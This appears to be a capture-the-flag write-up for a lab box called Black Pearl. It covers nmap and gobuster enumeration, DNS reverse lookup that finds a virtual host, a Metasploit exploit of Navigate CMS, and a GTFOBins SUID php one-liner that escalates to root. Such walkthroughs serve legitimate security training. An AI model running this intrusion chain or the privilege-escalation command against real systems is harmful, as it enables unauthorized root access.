Host: 192.168.56.107

# Enumeration

## Nmap

```
nmap -A -p- 192.168.56.107 > nmap.scan
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-31 11:48 EDT
Nmap scan report for 192.168.56.107
Host is up (0.00041s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 66:38:14:50:ae:7d:ab:39:72:bf:41:9c:39:25:1a:0f (RSA)
|   256 a6:2e:77:71:c6:49:6f:d5:73:e9:22:7d:8b:1c:a9:c6 (ECDSA)
|_  256 89:0b:73:c1:53:c8:e1:88:5e:c3:16:de:d1:e5:26:0d (ED25519)
53/tcp open  domain  ISC BIND 9.11.5-P4-5.1+deb10u5 (Debian Linux)
| dns-nsid: 
|_  bind.version: 9.11.5-P4-5.1+deb10u5-Debian
80/tcp open  http    nginx 1.14.2
|_http-server-header: nginx/1.14.2
|_http-title: Welcome to nginx!
MAC Address: 08:00:27:ED:90:D6 (Oracle VirtualBox virtual NIC)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=10/31%OT=22%CT=1%CU=35815%PV=Y%DS=1%DC=D%G=Y%M=0800
OS:27%TM=6723A6CF%P=x86_64-pc-linux-gnu)SEQ(SP=F4%GCD=1%ISR=FB%TI=Z%CI=Z%II
OS:=I%TS=A)SEQ(SP=FB%GCD=1%ISR=FD%TI=Z%CI=Z%II=I%TS=A)SEQ(SP=FB%GCD=1%ISR=F
OS:E%TI=Z%CI=Z%II=I%TS=A)SEQ(SP=FC%GCD=1%ISR=FF%TI=Z%CI=Z%II=I%TS=A)OPS(O1=
OS:M5B4ST11NW7%O2=M5B4ST11NW7%O3=M5B4NNT11NW7%O4=M5B4ST11NW7%O5=M5B4ST11NW7
OS:%O6=M5B4ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y
OS:%DF=Y%T=40%W=FAF0%O=M5B4NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD
OS:=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%D
OS:F=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O
OS:=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40
OS:%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.41 ms 192.168.56.107

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.96 seconds

```

## GoBuster (port 80)

```
gobuster dir -u http://192.168.56.107 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.56.107
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/secret               (Status: 200) [Size: 209]
Progress: 220560 / 220561 (100.00%)
===============================================================
Finished
===============================================================

```

wget http://192.168.56.107/secret

cat secret

```
OMG you got r00t !

Just kidding... search somewhere else. Directory busting won't give anything.

<This message is here so that you don't waste more time directory busting this particular website.>

- Alek 

```

Ok no more directory busting.

Maybe the nginx version is vulnerable…

```
$ searchsploit nginx 1.14  
Exploits: No Results
Shellcodes: No Results
```

Nevermind. 

Or ISC Bind?

```
$ searchsploit ISC BIND 9   
------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                    |  Path
------------------------------------------------------------------------------------------------------------------ ---------------------------------
ISC BIND (Linux/BSD) - Remote Buffer Overflow (1)                                                                 | linux/remote/19111.c
ISC BIND (Multiple OSes) - Remote Buffer Overflow (2)                                                             | linux/remote/19112.c
ISC BIND 4.9.7 -T1B - named SIGINT / SIGIOT Symlink                                                               | linux/local/19072.txt
ISC BIND 4.9.7/8.x - Traffic Amplification and NS Route Discovery                                                 | multiple/remote/19749.txt
ISC BIND 8 - Remote Cache Poisoning (1)                                                                           | linux/remote/30535.pl
ISC BIND 8 - Remote Cache Poisoning (2)                                                                           | linux/remote/30536.pl
ISC BIND 8.1 - Host Remote Buffer Overflow                                                                        | unix/remote/20374.c
ISC BIND 8.2.2 / IRIX 6.5.17 / Solaris 7.0 - NXT Overflow / Denial of Service                                     | unix/dos/19615.c
ISC BIND 8.2.2-P5 - Denial of Service                                                                             | linux/dos/20388.txt
ISC BIND 8.2.x - 'TSIG' Remote Stack Overflow (1)                                                                 | linux/remote/277.c
ISC BIND 8.2.x - 'TSIG' Remote Stack Overflow (2)                                                                 | linux/remote/279.c
ISC BIND 8.2.x - 'TSIG' Remote Stack Overflow (3)                                                                 | solaris/remote/280.c
ISC BIND 8.2.x - 'TSIG' Remote Stack Overflow (4)                                                                 | linux/remote/282.c
ISC BIND 8.3.x - OPT Record Large UDP Denial of Service                                                           | linux/dos/22011.c
ISC BIND 9 - Denial of Service                                                                                    | multiple/dos/40453.py
ISC BIND 9 - Remote Dynamic Update Message Denial of Service (PoC)                                                | multiple/dos/9300.c
ISC BIND 9 - TKEY (PoC)                                                                                           | multiple/dos/37721.c
ISC BIND 9 - TKEY Remote Denial of Service (PoC)                                                                  | multiple/dos/37723.py
Microsoft Windows Kernel - 'win32k!NtQueryCompositionSurfaceBinding' Stack Memory Disclosure                      | windows/dos/42750.cpp
Zabbix 2.0.5 - Cleartext ldap_bind_Password Password Disclosure (Metasploit)                                      | php/webapps/36157.rb
```

Doesn’t look like it.

Let’s explore port 53.

# DNS (port 53)

Dig info:

```
 dig 192.168.56.107

; <<>> DiG 9.20.2-1-Debian <<>> 192.168.56.107
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NXDOMAIN, id: 7202
;; flags: qr rd ra; QUERY: 1, ANSWER: 0, AUTHORITY: 1, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 65494
;; QUESTION SECTION:
;192.168.56.107.                        IN      A

;; AUTHORITY SECTION:
.                       10800   IN      SOA     a.root-servers.net. nstld.verisign-grs.com. 2024103100 1800 900 604800 86400

;; Query time: 16 msec
;; SERVER: 10.0.3.3#53(10.0.3.3) (UDP)
;; WHEN: Thu Oct 31 13:06:21 EDT 2024
;; MSG SIZE  rcvd: 118
```

Let’s use dnsrecon to see what the DNS server might reveal to us.

Dnsrecon:

```
$ dnsrecon -r 127.0.0.0/24 -n 192.168.56.107 -d blah
[*] Performing Reverse Lookup from 127.0.0.0 to 127.0.0.255
[+]      PTR blackpearl.tcm 127.0.0.1
[+] 1 Records Found

```

It looks like there is another host called blackpearl.tcm running on 192.168.56.107!

I’ll add blackpearl.tcm to my /etc/hosts file so that I can reach it.

```
127.0.0.1       localhost
127.0.1.1       kali
192.168.56.107  blackpearl.tcm
```

Then i’ll run gobuster again to enumerate this host:

```
# gobuster dir -u http://blackpearl.tcm -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://blackpearl.tcm
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/navigate             (Status: 301) [Size: 185] [--> http://blackpearl.tcm/navigate/]
Progress: 220560 / 220561 (100.00%)
===============================================================
Finished
===============================================================
```

I browse to navigate and see a web app called Navigate running. A quick google search finds an exploit for unauthenticated remote code execution in Navigate: https://www.rapid7.com/db/modules/exploit/multi/http/navigate_cms_rce/

I used metasploit to run the exploit and got a shell as www-data.

I ran linpeas and found this:

```
-rwsr-xr-x 1 root root 4.6M Feb 13  2021 /usr/bin/php7.3 (Unknown SUID binary!)
```

A binary for php7.3 with the SUID bit set. 

GTFOBins has an exploit for php with SUID set.

![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/9dbd598d-7e94-428f-b960-b32eeb89a882/72e2c44e-e43c-42d9-8d84-324f7ed655fd/image.png)

```
$ /usr/bin/php7.3 -r "pcntl_exec('/bin/sh', ['-p']);"
```

I ran the command and got root!

```
$ /usr/bin/php7.3 -r "pcntl_exec('/bin/sh', ['-p']);"
/usr/bin/php7.3 -r "pcntl_exec('/bin/sh', ['-p']);"
# id
id
uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)
# cd /root/
cd /root/
# ls
ls
flag.txt
# cat flag.txt  
cat flag.txt
Good job on this one.
Finding the domain name may have been a little guessy,
but the goal of this box is mainly to teach about Virtual Host Routing which is used in a lot of CTF.
```
